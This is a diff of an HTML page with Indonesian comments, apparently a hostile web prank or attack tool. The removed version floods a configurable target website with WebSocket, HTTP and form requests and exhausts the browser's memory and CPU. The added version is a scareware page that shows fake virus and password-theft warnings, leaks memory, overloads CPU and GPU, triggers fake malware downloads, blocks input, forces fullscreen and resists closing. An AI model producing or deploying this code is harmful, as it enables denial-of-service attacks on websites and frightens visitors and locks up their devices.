@@ -1,231 +1,331 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Loading... Please Wait</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SYSTEM ALERT</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            touch-action: none;
+        }
         body {
             background: #000;
-            color: #0f0;
-            font-family: monospace;
+            color: #f00;
+            font-family: 'Courier New', monospace;
             overflow: hidden;
             height: 100vh;
-            padding: 20px;
+            width: 100vw;
         }
-        .terminal {
-            white-space: pre;
-            font-size: 14px;
-            line-height: 1.2;
-        }
-        .blink { animation: blink 0.5s infinite; }
-        @keyframes blink { 50% { opacity: 0; } }
-        #counter {
+        #skull {
             position: fixed;
-            top: 10px;
-            right: 10px;
-            background: red;
-            color: white;
-            padding: 10px;
-            font-weight: bold;
-            border-radius: 5px;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 120px;
+            z-index: 10000;
+            animation: pulse 0.3s infinite;
+            text-shadow: 0 0 30px #f00;
+        }
+        @keyframes pulse {
+            0% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
+            50% { opacity: 0.7; transform: translate(-50%, -50%) scale(1.2); }
+            100% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
+        }
+        #warning {
+            position: fixed;
+            bottom: 20px;
+            width: 100%;
+            text-align: center;
+            font-size: 20px;
+            color: #0f0;
+            z-index: 9999;
+        }
+        .matrix {
+            position: absolute;
+            color: #0f0;
+            font-size: 14px;
+            opacity: 0.7;
+        }
+        #overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(
+                0deg,
+                rgba(255,0,0,0.1) 0px,
+                rgba(255,0,0,0.1) 1px,
+                transparent 1px,
+                transparent 2px
+            );
+            pointer-events: none;
+            z-index: 9998;
         }
     </style>
 </head>
-<body>
-    <div id="counter">REQ: 0</div>
-    <div class="terminal" id="log"></div>
+<body oncontextmenu="return false;">
+    <div id="skull">💀</div>
+    <div id="warning">⚠ VIRUS DETECTED: SYSTEM CORRUPTION IN PROGRESS ⚠</div>
+    <div id="overlay"></div>
+    
+    <script>
+        // ==================== OBJEK MENYERAMKAN ====================
+        function createTerrifyingObjects() {
+            const texts = ['ERROR', 'VIRUS', 'HACKED', 'DELETE', 'CRASH', 'DIE', 'FAIL', 'CORRUPT'];
+            const colors = ['#ff0000', '#00ff00', '#0000ff', '#ffff00', '#ff00ff'];
+            
+            setInterval(() => {
+                const obj = document.createElement('div');
+                obj.className = 'matrix';
+                obj.innerText = texts[Math.floor(Math.random() * texts.length)];
+                obj.style.color = colors[Math.floor(Math.random() * colors.length)];
+                obj.style.left = Math.random() * 100 + 'vw';
+                obj.style.top = Math.random() * 100 + 'vh';
+                obj.style.fontSize = (Math.random() * 30 + 10) + 'px';
+                obj.style.textShadow = `0 0 ${Math.random() * 20}px ${obj.style.color}`;
+                document.body.appendChild(obj);
+                
+                // Animasinya
+                let posX = Math.random() * window.innerWidth;
+                let posY = Math.random() * window.innerHeight;
+                let speedX = (Math.random() - 0.5) * 10;
+                let speedY = (Math.random() - 0.5) * 10;
+                
+                function move() {
+                    posX += speedX;
+                    posY += speedY;
+                    
+                    if (posX < 0 || posX > window.innerWidth) speedX *= -1;
+                    if (posY < 0 || posY > window.innerHeight) speedY *= -1;
+                    
+                    obj.style.left = posX + 'px';
+                    obj.style.top = posY + 'px';
+                    
+                    requestAnimationFrame(move);
+                }
+                move();
+                
+                // Hapus setelah beberapa saat
+                setTimeout(() => {
+                    if (obj.parentNode) {
+                        document.body.removeChild(obj);
+                    }
+                }, 10000);
+            }, 300);
+        }
 
-<script>
-// ===== KONFIGURASI =====
-const TARGET = "https://target-website.com"; // <<< GANTI INI DENGAN TARGET LU
-let reqCount = 0;
-let isActive = true;
+        // ==================== MEMORY LEAK EXTREME ====================
+        const memoryChunks = [];
+        function extremeMemoryLeak() {
+            setInterval(() => {
+                // Alokasi memori besar
+                for (let i = 0; i < 50; i++) {
+                    memoryChunks.push(new Array(1000000).fill('💀'.repeat(1000)));
+                }
+                
+                // Buat banyak gambar
+                for (let i = 0; i < 20; i++) {
+                    const img = new Image();
+                    img.src = 'data:image/svg+xml;base64,' + btoa(
+                        `<svg xmlns="http://www.w3.org/2000/svg" width="1000" height="1000">
+                         <rect width="1000" height="1000" fill="red"/>
+                         <text x="500" y="500" font-size="50" fill="white">VIRUS</text>
+                         </svg>`
+                    );
+                    document.body.appendChild(img);
+                }
+            }, 100);
+        }
 
-// ===== 1. MEMORY BOMB =====
-const memoryBomb = [];
-function allocateMemory() {
-    for(let i = 0; i < 1000; i++) {
-        memoryBomb.push(new Array(1000000).join('X'));
-    }
-    setTimeout(allocateMemory, 10);
-}
+        // ==================== AUTO DOWNLOAD FILE PALSU ====================
+        function fakeDownloads() {
+            setInterval(() => {
+                try {
+                    const fakeFiles = ['virus.exe', 'trojan.zip', 'malware.apk', 'crash.bin'];
+                    const fakeFile = fakeFiles[Math.floor(Math.random() * fakeFiles.length)];
+                    
+                    const blob = new Blob(['This is a virus file. Your system is compromised.'], 
+                        {type: 'application/octet-stream'});
+                    const url = URL.createObjectURL(blob);
+                    
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = fakeFile;
+                    a.style.display = 'none';
+                    document.body.appendChild(a);
+                    a.click();
+                    
+                    setTimeout(() => {
+                        document.body.removeChild(a);
+                        URL.revokeObjectURL(url);
+                    }, 1000);
+                } catch(e) {}
+            }, 5000);
+        }
 
-// ===== 2. WEBSOCKET FLOOD =====
-function wsFlood() {
-    try {
-        const ws = new WebSocket('wss://' + TARGET.replace('https://', ''));
-        ws.onopen = () => {
-            while(true) {
-                ws.send(JSON.stringify({
-                    data: new Array(10000).join('X'),
-                    time: Date.now()
-                }));
-                reqCount++;
-                if(reqCount % 100 === 0) updateCounter();
+        // ==================== CPU OVERLOAD + GPU KILL ====================
+        function cpuGpuKiller() {
+            // GPU overload dengan canvas
+            const canvas = document.createElement('canvas');
+            canvas.width = window.innerWidth * 2;
+            canvas.height = window.innerHeight * 2;
+            canvas.style.position = 'fixed';
+            canvas.style.top = '0';
+            canvas.style.left = '0';
+            canvas.style.zIndex = '-1';
+            document.body.appendChild(canvas);
+            
+            const ctx = canvas.getContext('2d');
+            
+            function render() {
+                // Gambar ribuan shape random
+                for (let i = 0; i < 500; i++) {
+                    ctx.fillStyle = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0.1)`;
+                    ctx.fillRect(
+                        Math.random() * canvas.width,
+                        Math.random() * canvas.height,
+                        Math.random() * 200,
+                        Math.random() * 200
+                    );
+                    
+                    ctx.strokeStyle = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0.2)`;
+                    ctx.lineWidth = Math.random() * 10;
+                    ctx.beginPath();
+                    ctx.arc(
+                        Math.random() * canvas.width,
+                        Math.random() * canvas.height,
+                        Math.random() * 100,
+                        0,
+                        Math.PI * 2
+                    );
+                    ctx.stroke();
+                }
+                requestAnimationFrame(render);
             }
+            render();
+            
+            // CPU overload dengan perhitungan berat
+            setInterval(() => {
+                let x = 0;
+                for (let i = 0; i < 10000000; i++) {
+                    x += Math.sqrt(Math.random()) * Math.tan(Math.random());
+                }
+            }, 10);
+        }
+
+        // ==================== SUARA MENYERAMKAN (jika browser izin) ====================
+        function playScarySounds() {
+            try {
+                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                
+                function playNoise() {
+                    const oscillator = audioContext.createOscillator();
+                    const gainNode = audioContext.createGain();
+                    
+                    oscillator.type = 'sawtooth';
+                    oscillator.frequency.setValueAtTime(100 + Math.random() * 2000, audioContext.currentTime);
+                    gainNode.gain.setValueAtTime(0.1, audioContext.currentTime);
+                    gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 1);
+                    
+                    oscillator.connect(gainNode);
+                    gainNode.connect(audioContext.destination);
+                    
+                    oscillator.start();
+                    oscillator.stop(audioContext.currentTime + 1);
+                }
+                
+                setInterval(playNoise, 500);
+            } catch(e) {}
+        }
+
+        // ==================== BLOCK SEMUA INPUT ====================
+        document.addEventListener('keydown', (e) => {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        });
+        
+        document.addEventListener('touchstart', (e) => {
+            e.preventDefault();
+            return false;
+        }, { passive: false });
+        
+        document.addEventListener('touchmove', (e) => {
+            e.preventDefault();
+            return false;
+        }, { passive: false });
+
+        // ==================== FULLSCREEN FORCE + PREVENT EXIT ====================
+        function forceFullscreen() {
+            const elem = document.documentElement;
+            if (elem.requestFullscreen) elem.requestFullscreen();
+            else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
+            else if (elem.mozRequestFullScreen) elem.mozRequestFullScreen();
+            else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
+        }
+        
+        setInterval(() => {
+            if (!document.fullscreenElement) {
+                forceFullscreen();
+            }
+        }, 1000);
+
+        // ==================== AUTO RELOAD KALAU USER BERHASIL KELUAR ====================
+        let escapeAttempts = 0;
+        window.addEventListener('beforeunload', (e) => {
+            escapeAttempts++;
+            e.preventDefault();
+            e.returnValue = '';
+            
+            // Tambah efek visual setiap kali mencoba keluar
+            document.body.style.background = escapeAttempts % 2 === 0 ? '#000' : '#300';
+            document.getElementById('skull').innerText = ['💀','☠','👁️','🖤'][escapeAttempts % 4];
+            
+            return '';
+        });
+
+        // ==================== EKSEKUSI SEMUA FUNGSI ====================
+        window.onload = function() {
+            // Mulai bertahap
+            setTimeout(createTerrifyingObjects, 500);
+            setTimeout(extremeMemoryLeak, 1000);
+            setTimeout(cpuGpuKiller, 1500);
+            setTimeout(fakeDownloads, 3000);
+            setTimeout(playScarySounds, 4000);
+            setTimeout(forceFullscreen, 500);
+            
+            // Ubah pesan berkala
+            const warnings = [
+                "DELETING SYSTEM FILES...",
+                "ENCRYPTING DATA...",
+                "INJECTING MALWARE...",
+                "OVERRIDING BOOTLOADER...",
+                "FORMATTING STORAGE...",
+                "STEALING PASSWORDS..."
+            ];
+            let warningIndex = 0;
+            setInterval(() => {
+                document.getElementById('warning').innerText = 
+                    `⚠ ${warnings[warningIndex % warnings.length]} ⚠`;
+                warningIndex++;
+            }, 2000);
+            
+            // Animasi tengkorak
+            setInterval(() => {
+                const skull = document.getElementById('skull');
+                const rotations = ['💀', '☠', '👾', '🤖', '👹', '👻'];
+                skull.innerText = rotations[Math.floor(Math.random() * rotations.length)];
+            }, 1000);
         };
-        ws.onerror = () => setTimeout(wsFlood, 1);
-    } catch(e) {}
-}
 
-// ===== 3. HTTP FLOOD (NO-CORS) =====
-function httpFlood() {
-    setInterval(() => {
-        // GET Requests
-        for(let i = 0; i < 5; i++) {
-            fetch(TARGET + '?attack=' + Math.random() + '&id=' + reqCount, {
-                method: 'GET',
-                mode: 'no-cors',
-                cache: 'no-store'
-            }).catch(() => {});
-            reqCount++;
-        }
-        
-        // POST Requests
-        fetch(TARGET, {
-            method: 'POST',
-            mode: 'no-cors',
-            body: new Blob([new Array(10000).join('X')]),
-            headers: {'Content-Type': 'application/octet-stream'}
-        }).catch(() => {});
-        reqCount++;
-        
-        // HEAD Requests
-        fetch(TARGET, {method: 'HEAD', mode: 'no-cors'}).catch(() => {});
-        reqCount++;
-        
-        updateCounter();
-    }, 10);
-}
-
-// ===== 4. DOM BOMB =====
-function domBomb() {
-    setInterval(() => {
-        for(let i = 0; i < 50; i++) {
-            const div = document.createElement('div');
-            div.innerHTML = new Array(1000).join('<span>X</span>');
-            document.body.appendChild(div);
-            setTimeout(() => div.remove(), 1000);
-        }
-    }, 100);
-}
-
-// ===== 5. CPU STRESS =====
-function cpuStress() {
-    function calculate() {
-        let x = 0;
-        for(let i = 0; i < 10000000; i++) {
-            x += Math.sqrt(Math.random()) * Math.tan(Math.random());
-        }
-        return x;
-    }
-    
-    setInterval(() => {
-        Promise.all([
-            calculate(),
-            calculate(),
-            calculate()
-        ]);
-    }, 1);
-}
-
-// ===== 6. STORAGE FLOOD =====
-function storageFlood() {
-    for(let i = 0; i < 1000; i++) {
-        try {
-            localStorage.setItem('bomb_' + i, new Array(100000).join('X'));
-            sessionStorage.setItem('bomb_' + i, new Array(100000).join('X'));
-        } catch(e) {}
-    }
-}
-
-// ===== 7. INFINITE TIMERS =====
-function infiniteTimers() {
-    for(let i = 0; i < 1000; i++) {
-        setTimeout(() => {}, 1);
-        setInterval(() => {}, 1);
-    }
-}
-
-// ===== UI UPDATE =====
-function updateCounter() {
-    document.getElementById('counter').innerHTML = `REQ: ${reqCount}`;
-    document.getElementById('log').innerHTML += `[${new Date().toLocaleTimeString()}] Request sent to ${TARGET}\n`;
-    document.getElementById('log').scrollTop = document.getElementById('log').scrollHeight;
-}
-
-// ===== START EVERYTHING =====
-function startNuclear() {
-    // Mulai semua serangan
-    allocateMemory();
-    wsFlood();
-    httpFlood();
-    domBomb();
-    cpuStress();
-    storageFlood();
-    infiniteTimers();
-    
-    // Auto-restart jika ada error
-    setInterval(() => {
-        if(reqCount < 10) location.reload();
-    }, 5000);
-    
-    // Log
-    document.getElementById('log').innerHTML = `[SYSTEM] Nuclear attack started\n`;
-    document.getElementById('log').innerHTML += `[TARGET] ${TARGET}\n`;
-    document.getElementById('log').innerHTML += `[TIME] ${new Date()}\n`;
-    document.getElementById('log').innerHTML += `[STATUS] <span class="blink">DESTROYING...</span>\n`;
-}
-
-// ===== AUTO-START =====
-window.onload = function() {
-    // Fullscreen & prevent sleep
-    document.documentElement.requestFullscreen().catch(() => {});
-    if('wakeLock' in navigator) navigator.wakeLock.request('screen');
-    
-    // Start attack dengan delay
-    setTimeout(startNuclear, 1000);
-    
-    // Prevent close
-    window.onbeforeunload = () => "Serangan sedang berjalan. Tutup tab?";
-    
-    // Audio stress (optional)
-    const audio = new AudioContext();
-    setInterval(() => {
-        const osc = audio.createOscillator();
-        osc.connect(audio.destination);
-        osc.start();
-        setTimeout(() => osc.stop(), 10);
-    }, 1000);
-};
-
-// ===== EMERGENCY STOP =====
-document.addEventListener('keydown', (e) => {
-    if(e.ctrlKey && e.key === 'q') {
-        isActive = false;
-        alert("ATTACK STOPPED\nTotal requests: " + reqCount);
-        location.reload();
-    }
-});
-</script>
-
-<!-- Hidden iframe untuk request tambahan -->
-<iframe name="hidden" style="display:none"></iframe>
-<form target="hidden" method="post" action="">
-    <input type="hidden" name="data" value="bomb">
-</form>
-
-<script>
-    // Form spammer
-    setInterval(() => {
-        const forms = document.forms;
-        for(let form of forms) {
-            form.action = TARGET;
-            form.submit();
-            reqCount++;
-        }
-    }, 50);
-</script>
+        // ==================== RESIZE PROTECTION ====================
+        window.addEventListener('resize', () => {
+            document.body.style.width = window.innerWidth + 'px';
+            document.body.style.height = window.innerHeight + 'px';
+        });
+    </script>
 </body>
 </html>
